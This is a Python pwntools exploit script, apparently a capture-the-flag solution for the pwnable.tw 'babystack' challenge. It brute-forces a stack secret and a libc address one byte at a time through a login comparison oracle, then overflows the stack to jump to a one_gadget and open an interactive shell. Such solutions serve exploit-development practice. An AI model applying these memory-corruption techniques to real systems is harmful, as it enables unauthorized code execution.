#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
#  import roputils as rp
import os
import pdb
import sys

elfPath = "./babystack"
libcPath = "./libc_64.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10205

#  context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    info("strcpy -> {:#x}".format(base + 0xEBB))
    info("strncmp -> {:#x}".format(base + 0xE43))
    info("break -> {:#x}".format(base + 0xF87))
    raw_input("DEBUG: ")


def login(payload, logged = False):
    #  pause()
    io.sendlineafter(">> ", "1")
    if logged:
        return
    io.sendafter("passowrd :", payload)

def copy(payload):
    io.sendlineafter(">> ", "3")
    assert len(payload) < 64
    io.sendafter("Copy :", payload)
    
def brute(prefix, l):
    key = ""
    for i in xrange(l):
        for j in xrange(1, 256):
            if chr(j) != '\n':
                login(prefix + key + chr(j) + '\0')
                if "Success" in io.recvline():
                    key += chr(j)
                    info("{} -> {}".format(i, key.encode('hex')))
                    login("", True)
                    break

    assert len(key) == l
    success("Find it -> {}".format(key.encode('hex')))
    return key

if __name__ == "__main__":
    random = brute("", 16)
    sleep(0.01)
    login("\0" + '0' * (0x48 - 1))
    sleep(0.01)
    #  DEBUG()
    copy('a')
    sleep(0.01)
    login("", True)
    #  context.log_level = "debug"
    libc.address = u64(brute('00000000', 6).ljust(8, '\0')) - libc.sym['_IO_file_setbuf'] - 9
    success("libc -> {:#x}".format(libc.address))
    one_gadget = 0x45216 + libc.address

    #  DEBUG()
    payload = '\0' + '0' * (0x40 - 1) + random 
    payload = payload.ljust(0x68, '0') + p64(one_gadget)
    #  payload = '\0' + '0000000'
    login(payload)
    copy('a')

    io.sendlineafter(">> ", "2")

    io.interactive()
